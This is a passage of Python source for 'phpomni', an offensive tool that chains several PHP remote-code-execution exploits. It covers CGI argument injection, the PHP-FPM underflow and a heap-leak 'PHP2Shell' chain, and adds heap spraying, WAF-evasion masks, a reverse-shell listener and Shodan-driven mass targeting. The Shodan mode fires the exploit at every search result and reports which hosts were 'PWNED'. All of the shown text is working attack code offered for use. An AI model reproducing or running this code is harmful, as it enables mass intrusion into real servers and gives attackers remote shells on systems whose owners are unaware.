                  f"to '{nm}' for the next attempt")
        ex.rotate()
        if spray_cycles > 0:
            ex.heap_spray(max(2, spray_cycles // 2))

    if not chunk:
        if oom_confirmed:
            t.log("[*] OOM prelude confirmed but the leak never arrived - "
                  "post-restart window missed, or the requests landed on "
                  "different workers, or a server-side fastcgi_read_timeout "
                  "(~60s default) killed the pin partway: if pinning worked "
                  "at first and then stopped, reduce --chain-retries or "
                  "split the run.")
        elif transport_cap is not None and transport_cap < 4:
            t.log("[*] stage-1 escalation aborted: transport body cap is "
                  "below 4MB - transport limit, not a layout failure.")
        else:
            ceiling = huge_mb_max if transport_cap is None \
                else min(huge_mb_max, transport_cap)
            if ex.huge_mb >= ceiling:
                t.log(f"[*] worker survived at {ex.huge_mb}MB and no 413 "
                      f"seen — either memory_limit exceeds the cap (raise "
                      f"--huge-mb-max) or the leak is failing for a layout "
                      f"reason, not OOM. If this target answers 200s "
                      f"consistently, also try varying --pin-workers (1-8; "
                      "must stay strictly below pm.max_children): multi-"
                      "worker round-robin is the other classic cause.")
        t.log("[-] prong 2+3: HEAP_LEAK_FAILED (patched, hardened, "
              "unpinned multi-worker, or incompatible SAPI/build)")
        return None

    # ---- stage 2: libphp leak with (t, v) grid sweep (v9.5) ----
    libphp = 0
    win = None
    for cand in candidates:
        t_base = cand["stage2_t"]
        v_set = [cand["stage2_v"]] + [v for v in (1, 8, 16, 32)
                                     if v != cand["stage2_v"]]
        grid = [(ta, va)
                for va in v_set
                for ta in range(max(0, t_base - 8), t_base + 9)]
        tried = 0
        for (ta, va) in grid:
            tried += 1
            cfg2 = dict(cand)
            cfg2["stage2_t"] = ta
            cfg2["stage2_v"] = va
            ex2 = Php2ShellExploit(t, cmd, cfg2, huge_mb=ex.huge_mb,
                                   verbose=t.verbose)
            t.log(f"[*] stage 2 sweep: profile '{cand['name']}' "
                  f"t={ta} v={va} ({tried}/{len(grid)})")
            try:
                libphp = ex2.stage2()
            except OSError as e:
                t.log(f"[-] request error: {e}")
            if libphp:
                t.log(f"[+] libphp base = 0x{libphp:x} (t={ta} v={va} - "
                      f"validated; swept variant of '{cand['name']}')")
                win = ex2
                break
            if t.last_status == 413:
                ex2.huge_mb = max(4, ex2.huge_mb - 4)
            if t.was_status(Phase.SPRAY, 403) or t.was_status(Phase.STAGE2, 403):
                nm = t.rotate_mp_mask()
                t.log(f"[*] WAF-shaped 403s - rotating mask to '{nm}'")
            ex2.rotate()
            if spray_cycles > 0:
                ex2.heap_spray(max(2, spray_cycles // 3))
        if libphp:
            break
    if not libphp:
        t.log("[-] prong 2+3: LIBPHP_LEAK_FAILED (no (t,v) grid point "
              "validated; supply --offsets-json with a profile for this "
              "distro/build - use phpomni_resolve.py offline)")
        return None
    win.rotate()

    cand = win.cfg
    htdata = chunk + cand["htdata"]
    zif_addr = libphp + cand["zif"]
    t.log(f"[*] stage 3: HTDATA=0x{htdata:x} ZIF=0x{zif_addr:x}")

    # v9.5: pad layouts are a per-target search, not a per-profile constant.
    T_PAD_SETS = ([(31, 31)] * 6, [(8, 7)] + [(7, 7)] * 5,
                  [(15, 15)] * 6, [(7, 7)] * 6, [(23, 23)] * 6, [(16, 16)] * 6)
    cmd_str = cmd if isinstance(cmd, str) else cmd.decode()
    KNOWN_OUTPUT = (("id", "uid="), ("whoami", ""), ("uname -a", "Linux"))
    verify_hint = next((sig for c, sig in KNOWN_OUTPUT
                       if cmd_str.strip() == c and sig), None) or None

    for pads in T_PAD_SETS:
        cand3 = dict(cand)
        cand3["stage3_pads"] = pads
        ex3 = Php2ShellExploit(t, cmd, cand3, huge_mb=win.huge_mb,
                               verbose=t.verbose)
        t.log(f"[*] stage 3: firing pad layout {pads[0]}x{len(pads)}")
        try:
            ex3.stage3(htdata, zif_addr)
        except OSError as e:
            t.log(f"[-] request error: {e}")
        time.sleep(0.8)
        if verify_hint:
            try:
                st, body = t.get("/", read_cap=65536)
                if st == 200 and verify_hint.encode() in body:
                    t.log("[+] stage 3 VERIFIED: command output observed "
                          f"({verify_hint!r}) - real exec, not blind")
                    return (f"PHP2Shell prong (CVE-2026-109618+109619), "
                            f"stage 3 pad {pads[0]}x{len(pads)} VERIFIED "
                            f"(heap=0x{chunk:x} libphp=0x{libphp:x})")
            except OSError:
                pass
        if t.was_status(Phase.STAGE3, 502) or t.was_status(Phase.STAGE3, 503):
            t.log("[*] worker crashed at stage 3 - the exec may still have "
                  "landed; trying next pad layout")
        else:
            t.log("[-] no confirmation at this pad layout - trying the next")
    return (f"PHP2Shell prong (CVE-2026-109618+109619), stage 3 pad-retry "
            f"sweep fired ({len(T_PAD_SETS)} layouts; heap="
            f"0x{chunk:x} libphp=0x{libphp:x}; command executed blind - "
            "verify via --fetch or a shell callback)")


# ====================== shodan ======================

def shodan_get_targets(query: str, api_key: str, limit: int,
                       verbose: bool) -> list[str]:
    urls: list[str] = []
    page = 1
    while len(urls) < limit:
        api = ("https://api.shodan.io/shodan/host/search?key="
               + urllib.parse.quote(api_key)
               + "&query=" + urllib.parse.quote(query)
               + f"&page={page}")
        try:
            req = urllib.request.Request(api, headers={"User-Agent": "phpomni"})
            with urllib.request.urlopen(req, timeout=30) as r:
                data = json.loads(r.read().decode())
        except Exception as e:  # noqa: BLE001
            print(f"[-] Shodan API error: {e}", file=sys.stderr)
            break
        matches = data.get("matches", [])
        if not matches:
            break
        for m in matches:
            if len(urls) >= limit:
                break
            ip, port = m.get("ip_str"), m.get("port")
            if not ip or not port:
                continue
            scheme = "https" if m.get("_shodan", {}).get("module") == "https" \
                else "http"
            urls.append(f"{scheme}://{ip}:{port}/")
        total = data.get("total", 0)
        if verbose:
            print(f"[*] Shodan: {len(urls)}/{min(limit, total)} targets "
                  f"collected (query matched {total} total)", flush=True)
        page += 1
        if page * 100 > total:
            break
    return urls


# ====================== orchestration ======================

def recon(t: Target) -> tuple[int, int, int] | None:
    """Fetch the target page; banner info is telemetry only, never a gate.
    Carries the real leak-harvest hook (body after the header block)."""
    t.set_phase(Phase.RECON)
    try:
        resp = t.raw_request("GET", t.path, read_cap=65536, timeout=20.0)
        hdrs = split_headers(resp)
        t.headers = hdrs
        server = hdrs.get("server", "?")
        xpb = hdrs.get("x-powered-by", "")
        t.log(f"[*] recon: Server={server!r} X-Powered-By={xpb!r}")
        php_ver = parse_php_version(xpb) or parse_php_version(server)
        if php_ver:
            t.log(f"[*] recon: {banner_version_note(php_ver)}")
        t.note_leak(resp.partition(b"\r\n\r\n")[2])   # v9.1 real hook
        return php_ver
    except OSError as e:
        t.log(f"[-] recon failed: {e}")
        return None
    finally:
        t.set_phase(Phase.GENERAL)


def _looks_like_php(t: Target, php_ver, sapi_info: dict) -> bool:
    """v9.6.1: evidence-only PHP gate. Positive signals: a PHP version in
    the banner, X-Powered-By, an ACTIVE .php entry point that answered, or
    an FPM/FastCGI handler signature from real server behavior.

    Deliberately NOT string-matching our own heuristic messages: v9.6's
    startswith(('PHP','nginx','active PHP')) let 'nginx front (PHP behind
    it...)' through on Next.js targets - and the naive fix ('contains PHP')
    has the same hole one level down, since that message string itself
    contains 'PHP'. Only real evidence counts here.

    Unknown-but-present PHP behind a plain proxy is a documented false
    negative; --force overrides."""
    if php_ver is not None:
        return True
    if "php" in (t.headers.get("x-powered-by") or "").lower():
        return True
    if sapi_info.get("entry"):          # a .php URL answered with PHP-ish body
        return True
    sapi = (sapi_info.get("sapi") or "").lower()
    if "fastcgi" in sapi or "fpm" in sapi or sapi.startswith("php"):
        # FPM handler messages: 'PHP-FPM/FastCGI...', 'nginx -> PHP-FPM',
        # 'PHP via FastCGI/FPM', 'Windows CGI/FastCGI backend' - all real
        # server-behavior evidence, not our histogram guesses.
        return True
    return False


def exploit_url(url: str, args, listener: ShellListener | None = None) -> int:
    """Run all prongs against one target. Interactive shell handling is NOT
    done here - main() offers it once, at the end of the run, so sessions
    arriving late (delayed pipeline, prong 2+3 window) are never missed."""
    verbose_mode = not args.quiet
    try:
        t = Target(url, timeout=args.timeout, verbose=verbose_mode,
                   verify_ssl=not args.ignore_ssl)
    except ValueError as e:
        print(f"[-] bad URL {url!r}: {e}", file=sys.stderr)
        return 2
    t.log(f"[*] ===== target: {url} =====")
    php_ver = recon(t)

    sapi_info = detect_sapi(t, t.log) if not args.no_sapi_scan else {
        "sapi": "scan disabled", "windows": None, "skip_cgi": False,
        "entry": None, "static": False}

    if sapi_info.get("entry"):
        t.path = sapi_info["entry"]
        t.log(f"[*] target path retargeted to {t.path}")

    if sapi_info.get("static") and not args.force:
        d = diagnose(t)
        print(f"NOT PWNED: {url} :: static HTML target - no active PHP entry "
              f"point found (probed {', '.join('/' + h for h in PHP_ENTRY_HINTS)}); "
              "use --force to fire anyway"
              + (f" [{d}]" if d else ""), flush=True)
        return 1

    result = None

    # ---- prong 1: CGI - fires unless SAPI-immune (cheap, PHP-agnostic):
    #      deliberately BEFORE the non-PHP gate; Windows CGI boxes often
    #      carry no PHP banner at all ----
    if sapi_info.get("skip_cgi") and not args.force:
        t.log("[*] prong 1 skipped: SAPI fingerprint = "
              f"{sapi_info.get('sapi')!r} (use --force to fire anyway)")
    else:
        try:
            result = cgi_prong(t, args.cmd, listener=listener, lhost=args.lhost)
        except OSError as e:
            t.log(f"[-] prong 1 error: {e}")

    # ---- v9.6.1: evidence-only non-PHP fast gate for the heavy prongs ----
    php_likely = _looks_like_php(t, php_ver, sapi_info)
    if not php_likely and not args.force:
        t.log("[*] prongs 2-4 skipped: no PHP evidence (no PHP banner, "
              "no X-Powered-By, no active .php entry, no FastCGI handler "
              "signature) - non-PHP intake gate; --force overrides")
        d = diagnose(t)
        print(f"NOT PWNED: {url} (no prong succeeded; target shows no PHP "
              f"evidence){': ' + d if d else ''}", flush=True)
        return 1

    # ---- prong 4: PHP-FPM underflow - gated on front + version ----
    if result is None and not args.no_fpm:
        try:
            result = fpm_prong(t, args.cmd, php_ver, sapi_info,
                               listener=listener, lhost=args.lhost,
                               qmin=args.fpm_qsl_min, qmax=args.fpm_qsl_max,
                               qstep=args.fpm_qsl_step, tries=args.fpm_tries)
        except OSError as e:
            t.log(f"[-] prong 4 error: {e}")

    # ---- prong 2+3: PHP2Shell - full-chain retry (v9.6); each chain is a
    #      fresh probabilistic sample, worker pinning per chain (v9.6.1) ----
    if result is None:
        try:
            candidates = build_offset_candidates(args, t, php_ver, sapi_info)
        except (OSError, ValueError) as e:
            t.log(f"[-] prong 2+3 error (candidate build): {e}")
            candidates = []
        for chain in range(1, max(1, args.chain_retries) + 1):
            if chain > 1:
                t.log(f"[*] PHP2Shell full-chain retry {chain}/"
                      f"{args.chain_retries}")
            try:
                result = php2shell_prong(
                    t, args.cmd, php_ver, candidates=candidates,
                    retries=args.retries, force=args.force,
                    trust_banner=args.trust_banner, huge_mb=args.huge_mb,
                    huge_mb_max=args.huge_mb_max,
                    no_pre_rotate=args.no_pre_rotate,
                    spray_cycles=0 if args.no_spray else args.spray_cycles,
                    pin_workers=args.pin_workers)
            except (OSError, ValueError) as e:
                t.log(f"[-] prong 2+3 error (chain {chain}): {e}")
            if result:
                break
        if result and args.fetch:
            status, body = t.get(args.fetch)
            if status == 200:
                result += (f"\nFetched proof: {body.decode('latin1').strip()[:200]}")

    # v9.4.2: PWNED only on a verified result.
    if result and "unverified" not in result:
        print(f"PWNED: {url} :: {result}", flush=True)
        return 0
    d = diagnose(t)
    print(f"NOT PWNED: {url} (no prong succeeded)"
          + (f" :: diagnosis: {d}" if d else ""), flush=True)
    return 1


def main() -> int:
    ap = argparse.ArgumentParser(
        description="phpomni v9.6.1 - four-prong PHP exploit (CGI argument "
                    "injection with reflection-proof detection, PHP-FPM "
                    "underflow, PHP2Shell with stalled-POST worker pinning, "
                    "(t,v) sweep, pad-retry and self-adjusting OOM field) "
                    "with framework leak harvesting, WAF-evasion masks, "
                    "evidence-only non-PHP gate, chain retries, egress "
                    "pre-checks, PTY reverse-shell listener, and error-based "
                    "diagnostics",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    ap.add_argument("-u", "--url", help="target URL, e.g. http://target/index.php")
    ap.add_argument("-c", "--cmd", default="id",
                    help=f"command to execute. CGI/FPM prongs: any length. "
                         f"PHP2Shell prong: max {MAX_CMD} bytes")
    ap.add_argument("--lhost", default=None,
                    help="callback HOST placed into reverse-shell payloads "
                         "(pivot box / team server / NAT IP). If omitted, "
                         "auto-detected from the route toward the target.")
    ap.add_argument("--lport", type=int, default=None,
                    help="callback/listener PORT (activates the native listener; "
                         "default 4444 when --lhost is given; 443 is the "
                         "egress-friendliest choice)")
    ap.add_argument("--no-interact", action="store_true",
                    help="do not drop into an interactive PTY session after connect")
    ap.add_argument("--ignore-ssl", action="store_true",
                    help="skip TLS certificate verification (raw-IP, "
                         "self-signed, and mismatched-CN audits)")
    ap.add_argument("--no-sapi-scan", action="store_true",
                    help="disable the SAPI/entry-point detection layer "
                         "(always fire every prong, never skip static targets)")
    ap.add_argument("--spray-cycles", type=int, default=6,
                    help="heap-spray grooming cycles before PHP2Shell stage 1")
    ap.add_argument("--no-spray", action="store_true",
                    help="disable the heap spray entirely")
    ap.add_argument("--no-fpm", action="store_true",
                    help="disable the CVE-2019-11043 PHP-FPM prong")
    ap.add_argument("--fpm-qsl-min", type=int, default=1500)
    ap.add_argument("--fpm-qsl-max", type=int, default=2000)
    ap.add_argument("--fpm-qsl-step", type=int, default=5)
    ap.add_argument("--fpm-tries", type=int, default=4)
    ap.add_argument("--shodan", default="",
                    help='Shodan query, e.g. "x-powered-by: PHP/8.2" '
                         "(runs the exploit against results; needs an API "
                         "key; version-gated queries are the hit-rate move)")
    ap.add_argument("--api-key", default=os.environ.get("SHODAN_API_KEY", ""),
                    help="Shodan API key (or set SHODAN_API_KEY)")
    ap.add_argument("--shodan-limit", type=int, default=10)
    ap.add_argument("--trust-banner", action="store_true",
                    help="skip prong 2+3 when the banner claims a patched "
                         "PHP version (mass scans; stage-1 leak would "
                         "otherwise decide)")
    ap.add_argument("--force", action="store_true",
                    help="fire all prongs regardless of any gating signal "
                         "(overrides non-PHP gate, SAPI-immune, "
                         "static-HTML, and version-banner gates)")
    ap.add_argument("--retries", type=int, default=3,
                    help="genuine-miss budget per leak stage in the PHP2Shell "
                         "prong (OOM-survival and 413 probes do not "
                         "consume it in stage 1)")
    ap.add_argument("--chain-retries", type=int, default=2,
                    help="full PHP2Shell chains per target (each is a fresh "
                         "probabilistic sample; transport-cap and fail-fast "
                         "state carried across chains within the Target)")
    ap.add_argument("--pin-workers", type=int, default=1,
                    help="worker slots to pin with stalled POSTs during the "
                         "PHP2Shell chain (single-worker chain state). MUST "
                         "be STRICTLY LESS than pm.max_children - pinning "
                         "the whole pool deadlocks the chain's own requests "
                         "behind the pins. Default 1 works on any pool >= 2. "
                         "If pinning 'works for a while then stops', a "
                         "server-side fastcgi_read_timeout (~60s default) is "
                         "killing the stalls: reduce --chain-retries or "
                         "split the run. 0 disables. Note: on nginx with "
                         "fastcgi_request_buffering on (default) the pin "
                         "holds an nginx slot, not an FPM worker - it pins "
                         "the FPM child on Apache/mod_php and on unbuffered "
                         "nginx (the config upload-progress requires)")
    ap.add_argument("--profile", choices=("lab", "bookworm"), default="bookworm")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--offsets-json", default=None,
                    help="JSON file with extra offset profiles (use "
                         "phpomni_resolve.py to generate per-target profiles "
                         "offline)")
    ap.add_argument("--huge-mb", type=int, default=12,
                    help="OOM field size (MB) - STARTING point only; "
                         "auto-escalated toward --huge-mb-max")
    ap.add_argument("--huge-mb-max", type=int, default=128,
                    help="hard ceiling for OOM-field escalation")
    ap.add_argument("--no-pre-rotate", action="store_true")
    ap.add_argument("--fetch", default="",
                    help="GET this path after PHP2Shell stage 3 for proof")
    ap.add_argument("--timeout", type=float, default=30.0)
    ap.add_argument("-q", "--quiet", action="store_true")
    args = ap.parse_args()

    if args.url and args.shodan:
        ap.error("give either -u/--url or --shodan, not both")
    if args.url is None and not args.shodan:
        ap.error("give -u/--url or --shodan '<query>'")

    listener = None
    if args.lhost or args.lport:
        lport = args.lport or 4444
        listener = ShellListener("0.0.0.0", lport, verbose=not args.quiet)
        if not listener.start():
            return 2

    rc = 2
    try:
        if args.url:
            rc = exploit_url(args.url, args, listener=listener)
        elif args.shodan:
            if not args.api_key:
                print("Shodan mode needs --api-key or SHODAN_API_KEY",
                      file=sys.stderr)
                return 2
            targets = shodan_get_targets(args.shodan, args.api_key,
                                         args.shodan_limit,
                                         verbose=not args.quiet)
            if not targets:
                print("[-] no Shodan targets found", file=sys.stderr)
                return 2
            print(f"[*] running four-prong exploit against "
                  f"{len(targets)} targets")
            pwned, missed = [], []
            for u in targets:
                r = exploit_url(u, args, listener=listener)
                (pwned if r == 0 else missed).append(u)
            print("\n===== SUMMARY =====")
            print(f"PWNED ({len(pwned)}):")
            for u in pwned:
                print(f"  {u}")
            print(f"NOT PWNED ({len(missed)}):")
            for u in missed:
                print(f"  {u}")
            if listener:
                print(f"live reverse-shell sessions: {listener.count()}")
            rc = 0

        if listener and not args.no_interact and listener.count() > 0 \
                and sys.stdin.isatty():
            listener.list_sessions()
            listener.interact()
    finally:
        if listener:
            listener.close_all()
    return rc


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
